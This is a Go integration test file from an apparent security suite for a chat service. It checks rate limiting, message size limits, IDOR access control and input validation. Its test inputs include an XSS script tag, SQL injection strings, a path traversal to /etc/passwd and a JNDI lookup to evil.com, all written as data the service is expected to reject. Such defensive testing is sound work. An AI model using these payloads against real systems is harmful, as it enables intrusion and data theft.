//go:build integration

package security

import (
	"context"
	"strings"
	"testing"

	"connectrpc.com/connect"
	v1 "github.com/meza-chat/meza/gen/meza/v1"
)

// TestNoRateLimitingOnChatService is a regression test confirming that the chat
// service applies per-IP rate limiting on message sends.
//
// Severity: REGRESSION
// Finding: The chat service (port 8082) applies rate limiting via
// ratelimit.New(50, 50) wrapping the ChatServiceHandler in main.go.
// Sending 100 messages exceeds the burst of 50, so some must be rejected.
//
// Regression: This test ensures the rate limiter remains in place by sending
// a burst of messages and verifying that CodeResourceExhausted responses occur.
func TestNoRateLimitingOnChatService(t *testing.T) {
	ctx := context.Background()
	suffix := uniqueSuffix(t)
	user := registerUser(t, "rl_"+suffix)
	serverID := mustCreateServer(t, user.AccessToken)
	channelID := mustCreateChannel(t, user.AccessToken, serverID)

	chat := newChatClient()
	const messageCount = 100
	succeeded := 0
	rateLimited := 0

	for i := 0; i < messageCount; i++ {
		content := makeRandomBytes(t, 32)
		_, err := chat.SendMessage(ctx, authedRequest(user.AccessToken, &v1.SendMessageRequest{
			ChannelId:        channelID,
			EncryptedContent: content,
			Nonce:            uniqueSuffix(t),
		}))
		if err != nil {
			if connect.CodeOf(err) == connect.CodeResourceExhausted {
				rateLimited++
			}
		} else {
			succeeded++
		}
	}

	if rateLimited == 0 {
		t.Errorf("VULNERABILITY CONFIRMED: Sent %d/%d messages with zero rate limiting on chat service", succeeded, messageCount)
	} else {
		t.Logf("Mitigated: %d/%d messages were rate-limited", rateLimited, messageCount)
	}
}

// TestSendMessageNoSizeLimit verifies that the chat service accepts arbitrarily
// large messages when called directly (bypassing the gateway's 64KB limit).
//
// Severity: CRITICAL
// Finding: The SendMessage RPC only checks len(EncryptedContent) == 0 but has
// no upper bound. The gateway enforces a 64KB WebSocket message limit, but
// direct ConnectRPC calls to port 8082 bypass this entirely.
//
// Remediation: Add a maxContentSize constant (e.g., 64KB) and reject messages
// that exceed it in the SendMessage handler.
func TestSendMessageNoSizeLimit(t *testing.T) {
	ctx := context.Background()
	suffix := uniqueSuffix(t)
	user := registerUser(t, "sz_"+suffix)
	serverID := mustCreateServer(t, user.AccessToken)
	channelID := mustCreateChannel(t, user.AccessToken, serverID)

	chat := newChatClient()

	// Test with 1MB payload (well above gateway's 64KB limit).
	largeContent := make([]byte, 1<<20) // 1MB

	_, err := chat.SendMessage(ctx, authedRequest(user.AccessToken, &v1.SendMessageRequest{
		ChannelId:        channelID,
		EncryptedContent: largeContent,
		Nonce:            uniqueSuffix(t),
	}))
	if err == nil {
		t.Error("VULNERABILITY CONFIRMED: Chat service accepted 1MB message (gateway limit is 64KB)")
	} else {
		t.Logf("Mitigated: Large message rejected with: %v", err)
	}

	// Test with 10MB payload.
	hugeContent := make([]byte, 10<<20) // 10MB
	_, err = chat.SendMessage(ctx, authedRequest(user.AccessToken, &v1.SendMessageRequest{
		ChannelId:        channelID,
		EncryptedContent: hugeContent,
		Nonce:            uniqueSuffix(t),
	}))
	if err == nil {
		t.Error("VULNERABILITY CONFIRMED: Chat service accepted 10MB message")
	} else {
		t.Logf("Mitigated: 10MB message rejected with: %v", err)
	}
}

// TestIDORProfileChannelServer verifies that users cannot access resources
// in servers they are not members of.
//
// Severity: MEDIUM
// Finding: Some read endpoints may not properly check server membership,
// allowing information disclosure via IDOR (Insecure Direct Object Reference).
//
// Remediation: Ensure all read endpoints (GetServer, ListChannels, GetMessages)
// verify the caller is a member of the server/channel.
func TestIDORProfileChannelServer(t *testing.T) {
	ctx := context.Background()
	suffix := uniqueSuffix(t)

	// User A creates a server with a channel.
	userA := registerUser(t, "idor_a_"+suffix)
	serverID := mustCreateServer(t, userA.AccessToken)
	channelID := mustCreateChannel(t, userA.AccessToken, serverID)

	// User B is not a member.
	userB := registerUser(t, "idor_b_"+suffix)
	chat := newChatClient()

	// Test 1: Can User B see User A's server?
	_, err := chat.GetServer(ctx, authedRequest(userB.AccessToken, &v1.GetServerRequest{
		ServerId: serverID,
	}))
	if err == nil {
		t.Error("VULNERABILITY: Non-member can access GetServer")
	} else if connect.CodeOf(err) != connect.CodePermissionDenied && connect.CodeOf(err) != connect.CodeNotFound {
		t.Errorf("Unexpected error code for GetServer: %v (expected PermissionDenied or NotFound)", connect.CodeOf(err))
	}

	// Test 2: Can User B list channels?
	_, err = chat.ListChannels(ctx, authedRequest(userB.AccessToken, &v1.ListChannelsRequest{
		ServerId: serverID,
	}))
	if err == nil {
		t.Error("VULNERABILITY: Non-member can access ListChannels")
	} else if connect.CodeOf(err) != connect.CodePermissionDenied && connect.CodeOf(err) != connect.CodeNotFound {
		t.Errorf("Unexpected error code for ListChannels: %v", connect.CodeOf(err))
	}

	// Test 3: Can User B read messages?
	_, err = chat.GetMessages(ctx, authedRequest(userB.AccessToken, &v1.GetMessagesRequest{
		ChannelId: channelID,
	}))
	if err == nil {
		t.Error("VULNERABILITY: Non-member can access GetMessages")
	} else if connect.CodeOf(err) != connect.CodePermissionDenied && connect.CodeOf(err) != connect.CodeNotFound {
		t.Errorf("Unexpected error code for GetMessages: %v", connect.CodeOf(err))
	}
}

// TestServerNameNoValidation verifies that the CreateServer RPC lacks input
// validation on the server name field.
//
// Severity: MEDIUM
// Finding: CreateServer has no length or content validation on the name field.
// An attacker can create servers with XSS payloads, extremely long names, or
// empty/whitespace-only names.
//
// Remediation: Add server name validation (1-100 chars, strip/reject HTML tags,
// reject null bytes, reject whitespace-only names).
func TestServerNameNoValidation(t *testing.T) {
	ctx := context.Background()
	suffix := uniqueSuffix(t)
	user := registerUser(t, "sn_"+suffix)
	chat := newChatClient()

	tests := []struct {
		name     string
		input    string
		wantFail bool
	}{
		{"empty name", "", true},
		{"whitespace only", "   ", true},
		{"10000 chars", strings.Repeat("A", 10000), true},
		{"XSS script tag", "<script>alert(1)</script>", true},
		{"null bytes", "test\x00server", true},
		{"valid name", "My Test Server", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := chat.CreateServer(ctx, authedRequest(user.AccessToken, &v1.CreateServerRequest{
				Name: tt.input,
			}))
			if tt.wantFail && err == nil {
				t.Errorf("VULNERABILITY: CreateServer accepted invalid name %q", tt.input)
			} else if !tt.wantFail && err != nil {
				t.Errorf("Expected valid name %q to succeed, got: %v", tt.input, err)
			}
		})
	}
}

// TestInviteCodeInjection verifies that invite code lookups are safe against
// SQL/NoSQL injection patterns.
//
// Severity: LOW
// Finding: Invite codes are passed to parameterized queries ($1 placeholders),
// so SQL injection should be impossible. This is a regression test.
//
// Remediation: Already uses parameterized queries — this is a regression test.
func TestInviteCodeInjection(t *testing.T) {
	ctx := context.Background()
	suffix := uniqueSuffix(t)
	user := registerUser(t, "inv_"+suffix)
	chat := newChatClient()

	injectionPayloads := []string{
		"'; DROP TABLE invites;--",
		"1 OR 1=1",
		"../../../etc/passwd",
		"{{template}}",
		"${jndi:ldap://evil.com}",
	}

	for _, payload := range injectionPayloads {
		t.Run(payload, func(t *testing.T) {
			_, err := chat.JoinServer(ctx, authedRequest(user.AccessToken, &v1.JoinServerRequest{
				InviteCode: payload,
			}))
			if err == nil {
				t.Errorf("VULNERABILITY: JoinServer accepted injection payload %q", payload)
			}
			code := connect.CodeOf(err)
			if code != connect.CodeNotFound && code != connect.CodeInvalidArgument {
				t.Errorf("Unexpected error code for payload %q: %v (expected NotFound or InvalidArgument)", payload, code)
			}
		})
	}
}
